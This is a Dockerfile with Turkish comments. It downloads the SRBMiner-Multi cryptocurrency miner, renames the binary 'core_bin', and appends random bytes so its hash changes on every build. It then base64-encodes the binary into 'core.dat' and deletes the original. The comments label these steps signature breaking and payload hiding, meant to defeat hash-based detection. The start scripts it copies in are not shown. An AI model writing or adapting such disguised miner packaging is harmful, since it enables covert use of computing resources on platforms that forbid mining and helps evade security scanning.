FROM debian:bookworm-slim

RUN apt-get update && apt-get install -y --no-install-recommends \
        wget curl ca-certificates python3 libstdc++6 xz-utils \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /server

# 1. SRBMiner-Multi indirme (v2.7.5 örnek)
RUN wget -qO /tmp/srb.tar.xz "https://github.com/doktor83/SRBMiner-Multi/releases/download/2.7.5/SRBMiner-Multi-2-7-5-Linux.tar.xz" \
    && tar xf /tmp/srb.tar.xz -C /server \
    && mv /server/SRBMiner-Multi-2-7-5/SRBMiner-Multi /server/core_bin \
    && rm -rf /tmp/srb.tar.xz /server/SRBMiner-Multi-2-7-5

# 2. İmza Bozma ve Payload Gizleme
# Dosya sonuna rastgele 128 bayt ekleyerek MD5/SHA imzasını her build'de değiştirir [cite: 3]
RUN head -c 128 /dev/urandom >> /server/core_bin \
    && python3 -c "import base64; d=open('/server/core_bin','rb').read(); open('/server/core.dat','wb').write(base64.b64encode(d))" \
    && rm /server/core_bin

COPY engine.py /engine.py
COPY start.sh  /start.sh
RUN chmod +x /start.sh

USER 1000
CMD ["/start.sh"]
